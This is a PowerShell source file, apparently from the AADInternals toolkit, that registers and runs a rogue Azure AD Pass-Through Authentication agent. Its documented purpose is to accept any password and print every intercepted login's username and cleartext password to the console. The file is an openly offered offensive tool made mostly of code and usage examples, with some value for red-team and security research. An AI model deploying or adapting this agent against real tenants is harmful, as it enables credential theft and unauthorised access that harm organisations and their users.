# This file contains PTAAgent which can be used to emulate Azure AD Authentication Agent

# Mar 24th 2020
function Invoke-PTAAgent
{
<#
    .SYNOPSIS
    Invokes AN EXPERIMENTAL PTA Agent with given name and certificate.

    .DESCRIPTION
    Invokes PTA Agent with given name and certificate, and connect to Azure AD. Emulates Azure AD Authentication Agent by accepting any password and dumping them to console.
    NOTE: This is AN EXPERIMENTAL version likely to crash!

    .Example
    Invoke-AADIntPTAAgent -MachineName "server1.company.com"

    Connector 1 connecting to his-eur1-neur1
    Connector 2 connecting to his-eur1-neur1
    Connector 3 connecting to his-eur1-weur1
    Connector 4 connecting to his-eur1-weur1

    PTAAgent started, waiting for logins..

    .Example
    Register-AADIntPTAAgent -MachineName "server1.company.com"

    PTA agent registered as server1.company.com
    Certificate saved to PTA_client_certificate.pfx

    PS C:\>Invoke-AADIntPTAAgent -MachineName "server1.company.com"

    Connector 1 connecting to his-eur1-neur1
    Connector 2 connecting to his-eur1-neur1
    Connector 3 connecting to his-eur1-weur1
    Connector 4 connecting to his-eur1-weur1

    PTAAgent started, waiting for logins..

    .Example
    $pt=Get-AADIntAccessTokenForPTA
    PS C:\>Register-AADIntPTAAgent -AccessToken $pt -MachineName "server1.company.com" -FileName server1.pfx

    PTA agent registered as server1.company.com
    Certificate saved to server1.pfx

    PS C:\>Invoke-AADIntPTAAgent -MachineName "server1.company.com" -FileName server1.pfx

    Connector 1 connecting to his-eur1-neur1
    Connector 2 connecting to his-eur1-neur1
    Connector 3 connecting to his-eur1-weur1
    Connector 4 connecting to his-eur1-weur1

    PTAAgent started, waiting for logins..
   
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$MachineName,
        [Parameter(Mandatory=$False)]
        [String]$FileName="PTA_client_certificate.pfx"
    )
    Process
    {
        Write-Warning "About to start an EXPERIMENTAL VERSION of PTA Agent which likely crashes the PowerShell session!"
        if((Read-Host "Type YES to continue") -ne "yes")
        {
            return
        }

        # Open the PTA Agent in separate PowerShell session as it will eventually crash
        Invoke-Expression "cmd /c start powershell -Command {. `"$PSScriptRoot\PTAAgent.ps1`"; StartPTAAgent -MachineName $MachineName -FileName $FileName } -OutputFormat Text -NonInteractive"

    }

    
}

# Internal startup function
# Mar 30th 2020
function StartPTAAgent
{
[cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$MachineName,
        [Parameter(Mandatory=$False)]
        [String]$FileName="PTA_client_certificate.pfx"
    )

    Begin
    {
        # Add the C# type
        $PTAAgentCode=Get-Content -Path "$PSScriptRoot\PTAAgent.cs" -Encoding UTF8 -raw

        Add-Type -TypeDefinition $PTAAgentCode -Language CSharp	-ReferencedAssemblies @("System.Net.Http","System.Xml","System.Web")  -ErrorAction SilentlyContinue

        Remove-Variable PTAAgentCode

        # Set the title
        $host.ui.RawUI.WindowTitle="PTA Agent"
        $host.ui.RawUI.BackgroundColor = "red"
    }
    Process
    {

        $fullPath = (Get-Item $fileName).FullName
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::CreateFromCertFile($fullPath)

        Write-Host "`nStarting PTA Agent..`n"

        $agent = [AADInternals.PTAAgent]::new($cert, $MachineName)

        $agent.StartAgent()
        Write-Host "`nPTA Agent started, waiting for logins..`n"

        while($true)
        {
            # Get the status
            [Hashtable]$status = $agent.GetStatus()

            # Print all new logins
            if($status -and $status.Count -gt 0)
            {
                foreach($key in $status.Keys)
                {
                    $logins = $status[$key]
                    foreach($login in $logins)
                    {
                        Write-Host "$($login.timeStamp): ""$($login.userName)"" ""$($login.password)"""
                    }
                }
                $status.Clear()
                Start-Sleep -Seconds 3
            }
        }
        
    }
}
